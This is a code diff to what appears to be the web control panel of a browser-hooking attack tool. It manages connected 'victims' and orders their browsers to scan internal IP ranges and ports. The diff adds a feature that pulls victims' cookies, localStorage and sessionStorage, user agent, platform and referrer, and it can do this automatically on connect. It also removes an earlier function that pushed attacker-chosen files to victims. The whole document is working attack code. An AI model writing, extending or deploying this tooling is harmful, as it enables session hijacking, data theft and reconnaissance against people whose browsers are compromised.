@@ -83,10 +83,17 @@
     <button onclick="scan()">🔍 Start Scan</button>
   </div>
 
+  <!-- New section for collecting browser info -->
   <div class="section">
-    <label for="fileInput">📁 Select File:</label><br>
-    <input id="fileInput" type="file">
-    <button onclick="sendFile()">Send File</button>
+    <label>Collect Browser Information</label><br>
+    <input type="checkbox" id="info_useragent" checked> User Agent string<br>
+    <input type="checkbox" id="info_platform" checked> Platform (OS)<br>
+    <input type="checkbox" id="info_url" checked> Current URL and Referrer<br>
+    <input type="checkbox" id="info_plugins" checked> Installed Plugins<br>
+    <input type="checkbox" id="info_cookies" checked> Cookies<br>
+    <input type="checkbox" id="info_storage" checked> localStorage/sessionStorage<br>
+    <input type="checkbox" id="autoCollect"> Auto Collect on Connect<br>
+    <button onclick="collectInfo()">Collect Info</button>
   </div>
 
   <div class="section">
@@ -104,7 +111,7 @@
   </footer>
 
   <script>
-    const socket = new WebSocket("wss://192.168.1.12:8443/ws");
+    const socket = new WebSocket("wss://SERVER-IP:8443/ws");
     const victimSelect = document.querySelector("#victimSelect");
     const logOutput = document.querySelector("#response");
     const logLines = [];
@@ -117,11 +124,27 @@
     };
 
     socket.onmessage = event => {
-      const msg = event.data;
+      // Trim the incoming message to remove extra whitespace/newlines.
+      const msg = event.data.trim();
+      console.log("Received message:", msg);  // Debug log to browser console.
+
+      // Check if the message contains the collected info prefix.
+      const collectedIndex = msg.indexOf("[COLLECTED INFO]");
+      if (collectedIndex !== -1) {
+        const infoStr = msg.slice(collectedIndex + "[COLLECTED INFO]".length).trim();
+        try {
+          const parsed = JSON.parse(infoStr);
+          log("[COLLECTED INFO]\n" + JSON.stringify(parsed, null, 2));
+        } catch (e) {
+          log("[COLLECTED INFO] Parsing Error: " + e);
+          log(msg);
+        }
+        return;
+      }
+
       const interesting = ["[✅]", "[📄]", "[🟢]", "[🔴]"];
 
-      // Check if the message comes from a victim (it may start with a victim prefix)
-      // and remove that prefix for the purpose of checking interesting messages.
+      // Remove a victim prefix if present.
       let toCheck = msg;
       if (msg.startsWith("[") && msg.indexOf("]") !== -1) {
         const firstPrefix = msg.substring(0, msg.indexOf("]") + 1);
@@ -133,13 +156,22 @@
       // Log the message if it starts with an interesting prefix.
       if (interesting.some(prefix => toCheck.startsWith(prefix))) {
         log(msg);
+      } else {
+        // Fallback: log any raw message.
+        log("[RAW] " + msg);
       }
 
       // Process victim connection events.
       // Expected format: "[🟢] Victim connected: victim-1 (192.168.1.14)"
       if (msg.startsWith("[🟢] Victim connected: ")) {
         const match = msg.match(/Victim connected: (victim-\d+)\s+\(([^)]+)\)/);
-        if (match) addVictim(match[1], match[2]);
+        if (match) {
+          addVictim(match[1], match[2]);
+          // If auto-collect is enabled, send the collect command immediately.
+          if (document.querySelector("#autoCollect").checked) {
+            sendCollectCommand(match[1]);
+          }
+        }
       }
 
       // Process victim disconnection events.
@@ -163,18 +195,42 @@
     function scan() {
       const victim = getSelectedVictim();
       if (!victim) return alert("⚠️ Select a victim first.");
-
       const ipInput = document.querySelector("#iprange").value.trim();
       const portInput = document.querySelector("#ports").value.trim();
       const ips = expandIPRange(ipInput);
       const ports = expandPortList(portInput);
-
       for (const ip of ips) {
         for (const port of ports) {
           const url = `https://${ip}:${port}`;
           socket.send(`to:${victim}|${url}`);
         }
       }
+    }
+
+    // Build the collect info command based on selected checkboxes.
+    function buildCollectCommand() {
+      const fields = [];
+      if (document.querySelector("#info_useragent").checked) fields.push("useragent");
+      if (document.querySelector("#info_platform").checked) fields.push("platform");
+      if (document.querySelector("#info_url").checked) fields.push("urlref");
+      if (document.querySelector("#info_plugins").checked) fields.push("plugins");
+      if (document.querySelector("#info_cookies").checked) fields.push("cookies");
+      if (document.querySelector("#info_storage").checked) fields.push("storage");
+      return "collectinfo:" + fields.join(",");
+    }
+
+    // Send the collect info command to a specified victim.
+    function sendCollectCommand(victimId) {
+      const command = buildCollectCommand();
+      socket.send(`to:${victimId}|${command}`);
+      log(`[INFO REQUEST SENT] to ${victimId}: ${command}`);
+    }
+
+    // Trigger info collection for the currently selected victim.
+    function collectInfo() {
+      const victim = getSelectedVictim();
+      if (!victim) return alert("⚠️ Select a victim first.");
+      sendCollectCommand(victim);
     }
 
     // Updated addVictim function to store and display metadata.
@@ -256,27 +312,6 @@
       return Array.from(ports).filter(p => !isNaN(p));
     }
 
-    // Function to send a file selected by the attacker to the victim.
-    function sendFile() {
-      const fileInput = document.querySelector("#fileInput");
-      if (!fileInput.files.length) {
-        return alert("No file selected");
-      }
-      const file = fileInput.files[0];
-      const reader = new FileReader();
-      reader.onload = function(event) {
-        // event.target.result is a Data URL (e.g., "data:application/octet-stream;base64,...")
-        const dataUrl = event.target.result;
-        // Extract base64 part (after the comma)
-        const base64Data = dataUrl.split(",")[1];
-        // Construct command in the format: "file:filename|<base64Data>"
-        const command = `file:${file.name}|${base64Data}`;
-        socket.send(command);
-        log(`[FILE SENT] ${file.name} (${file.size} bytes)`);
-      };
-      reader.readAsDataURL(file);
-    }
-
     function log(msg) {
       logLines.push(msg);
       logOutput.textContent += msg + "\n";
@@ -293,13 +328,11 @@
       const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
       const filename = `log-${timestamp}.${format}`;
       let blob;
-
       if (format === "json") {
         blob = new Blob([JSON.stringify(logLines, null, 2)], { type: "application/json" });
       } else {
         blob = new Blob([logLines.join("\n")], { type: "text/plain" });
       }
-
       const link = document.createElement("a");
       link.href = URL.createObjectURL(blob);
       link.download = filename;
